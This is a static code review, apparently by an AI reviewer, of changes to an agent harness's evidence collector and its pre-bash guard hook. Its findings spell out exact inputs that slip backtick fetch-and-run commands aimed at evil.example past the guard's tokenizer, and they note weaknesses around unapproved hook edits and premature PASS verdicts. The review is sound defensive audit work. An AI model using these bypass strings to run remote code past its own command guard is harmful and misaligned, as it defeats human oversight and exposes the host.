review_summary: Static read of the diff and the numbered sources. I executed nothing and make no test-run claims. The evidence-proof retention in collect-evidence.sh is sound. It snapshots the proof before smoke, hashes raw bytes, validates strictly with Python, and restores the canonical copy. The tdd-ledger.sh config-failure classification also holds up, and every failure path I traced fails closed. The new awk backtick tokenizer in pre-bash-guard.sh has one blocking defect. Its comment detection treats a '#' after an escaped character as a comment start, but bash does not. A real command substitution that follows is hidden from the scan, and the input then passes every other check. The old raw regex denied this input, so it contradicts AC-19's 'previously blocked ... remain blocked'. The test file has no case for it. The other findings are low severity or nits. I did not check the consumers of evidence.json (check-local-evidence.py, validate-candidate-evidence.py) beyond what the fixture shows.

findings.title: Escaped char before '#' makes the tokenizer treat the rest of the line as a comment, hiding active backtick substitutions
findings.reason: The comment check at lines 239-240 breaks the scan when '#' is preceded by [[:space:];|&()]. The character before '#' may itself have been consumed as an escape (lines 226-227). Input: `: a\ #x; \`curl -s https://evil.example/c\``. Bash reads `a\ #x` as one literal word 'a #x', so '#' is not a comment, and `;` ends the command. The backtick substitution then runs at command position and executes the fetched text. The awk sees '\' set escaped, the space consumed by escaped, then '#' with a space before it, so it breaks. The payloads list stays empty and the mode is 'parsed', so line 271 does not fire. No other check matches: there is no `$(`, no pipe, no `<q>`, and no `curl .*|sh`. The hook exits 0. The old raw regex `` `[^`]*(curl|wget|fetch) `` denied this. The same hole opens with `\;#`, `\|#`, `\&#`, `\(#` and `\)#`. Fix: track whether the previous character was an escaped literal and either do not treat '#' as a comment then, or set ambiguous=1. Add deny cases for these inputs to pre-bash-guard-literals.sh.

findings.title: Backtick payloads inside single quotes are no longer scanned, so a wrapper-executed string loses a denial it used to get
findings.reason: Single-quoted text is skipped entirely (lines 211-213), by design, to allow prose such as 'Use `client.get` to fetch...'. Input: `nohup bash -c 'echo `curl -s https://evil.example/x | sh`'`. The cmdpos rule only matches bash at segment start, so the nohup/timeout/env/nice/xargs wrappers are not caught. The stripped form is `nohup bash -c <q>`. The old raw regex denied this and the new code allows it. A pipe-based payload in plain quotes (`timeout 5 sh -c 'curl x|sh'`) was already allowed, so this adds no new capability. It does weaken defense in depth, and AC-19 does not document the trade-off. Either deny single-quoted backtick+network tokens when a shell wrapper precedes the string, or record this as an accepted residual in the spec.

findings.title: Frontend fetch() mask only applies to lines that begin with const/let/var, so common frontend heredocs are still denied
findings.reason: The mask at lines 149-150 applies only when the line starts with `(const|let|var) NAME =`. Any other line, such as `await fetch(url);`, `return fetch(`/api/${id}`)`, `export const f = () => fetch(...)` or `async function load(){ ... fetch(...) }`, keeps the token 'fetch'. The cross-line regex at line 176 then matches an earlier template-literal backtick followed by that 'fetch' and returns body-network. The repair therefore covers only the specific test shapes. It fails closed, so this is not a security problem, but AC-19's 'accepts frontend fetch()' is narrower than it reads. Narrow the AC wording or broaden the mask.

findings.title: Heredoc body is accumulated by repeated string concatenation
findings.reason: `body = body body_line($0) "\n"` is O(n^2) in awks that copy on append, such as BWK awk on macOS. A very large heredoc (for example tens of thousands of lines written to a file) could make the guard slow enough to hit the hook timeout. A timed-out hook may be non-blocking, which would turn the slowdown into a fail-open. This is a medium-confidence concern; I could not measure it. Consider a per-line scan with carried state, or a size cap that falls back to the conservative raw check.

findings.title: Proof validation and hashing run `python3 -c` from the repo root without -I
findings.reason: These calls are on lines 106, 109 and 117, and the collector runs with cwd=ROOT. Without -I, sys.path[0] is the current directory. A planted json.py, hashlib.py or xml/ shim in the repo root would be imported by the code that validates and hashes the proof. Use `python3 -I -c` for all three calls, since this is the integrity path.

findings.title: Digest check and spec-match read are not atomic; evidence.json binding is only useful if consumers re-hash
findings.reason: The retained file is re-hashed at line 141, and spec-match reads it at line 160. A background process left running by the smoke command could rewrite it in that window. The manifest records results_sha256, but the diff does not show check-local-evidence.py or the evidence gate re-verifying it. If they do not, the digest adds no enforcement. Run spec-match on a private copy of the verified bytes, or confirm the consumers compare the digest.

findings.title: Config-frame heuristic can misclassify a genuine Playwright assertion RED as tooling-error
findings.reason: The assertion exemption requires a line starting `AssertionError`. Playwright's `expect` failures start `Error: expect(received)...`. If a genuine failure's stack includes a frame from playwright.config.ts (for example a helper or constant imported from the config), the RED is rejected. This fails closed and is rare, so it costs only a re-run. It is worth documenting as a known limitation.

findings.title: State file records verdict PASS with empty blockers while its own scope text says the independent review is pending
findings.reason: Lines 31-34 write `verdict: PASS` and `blockers: []`. Line 34 says final combined tests and the independent review are still pending. Any gate or reader that consumes `.verdict` will see a pass before the review result exists. This is a hand-written PASS ahead of its evidence. Set the verdict to pending, or write it only after the review completes. The file was also reformatted from compact to pretty JSON; check that nothing parses it positionally.

findings.title: Normalization strips only SGR color codes
findings.reason: The sed removes `ESC[...m` only. Other CSI sequences that runners emit, such as erase-line `ESC[2K` or cursor moves, can still sit before an otherwise anchored `failed to load config` or Startup Error line and defeat the `^` anchors. Strip `ESC\[[0-9;?]*[A-Za-z]`.

findings.title: Fixture can fail on its environment, and check-only attempt dirs accumulate
findings.reason: The fixture reads `date` once for the bundle name while the collector computes its own date, so a run across midnight breaks the pairing. The git commit in the fixture can fail under a global commit.gpgsign or hook configuration. Fixture construction sits outside the try/except, so this produces a traceback rather than a recorded failure. Separately, check-only now creates an `attempt-*` directory on every run (collect-evidence.sh:60), and all of them are listed in EVIDENCE.md's artifact index.

findings.title: Hook edit is a constitution-class change; the plan's authorization wording does not record operator approval for it
findings.reason: The spec's Constraints section says hooks/* edits require the operator escape hatch, with the bypass logged. The plan says no 'guard-override change is authorized' and does not say the operator performed this edit. Per the review instructions, approval text is not live authorization. Confirm the FORCE_CONSTITUTION_EDIT bypass log entry for .claude/hooks/pre-bash-guard.sh.

limitations: Static review only. I did not run the shell, awk, Python, or any of the test scripts, and I make no claim that the tests pass.
I traced the awk tokenizer by hand against bash semantics. Behavior may differ across awk implementations (mawk, BWK awk, gawk), for example in multibyte handling and string-append cost.

I did not see lib/atomic-write.sh (replace_atomic), spec-match.sh, check-local-evidence.py, validate-candidate-evidence.py, validate.sh or settings.json. Consumer-side digest verification and replace_atomic semantics are assumed, not verified.
Runner message formats for Vitest, Vite and Playwright (Startup Error banner, 'failed to load config from') are taken from the tests' own transcripts, not from installed runners.
Authorization and the constitution-guard bypass log cannot be verified from the supplied text. The exact source digest must be protected externally, as stated in the brief.
factory-bounded-process.py was supplied but is outside the diff, and I did not review it.
